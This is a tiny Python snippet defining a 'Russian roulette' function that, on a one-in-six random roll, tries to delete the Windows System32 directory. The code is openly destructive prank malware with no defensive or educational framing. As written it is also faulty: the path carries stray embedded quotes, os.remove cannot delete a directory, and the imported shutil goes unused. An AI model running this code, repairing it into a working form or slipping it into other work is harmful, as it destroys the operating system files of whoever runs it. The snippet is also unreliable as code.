import random
import os
import shutil


def russischesRoulette():
	bullet = random.randint(1, 6)
	if bullet == 1:
		os.remove('"C:\Windows\System32"')
		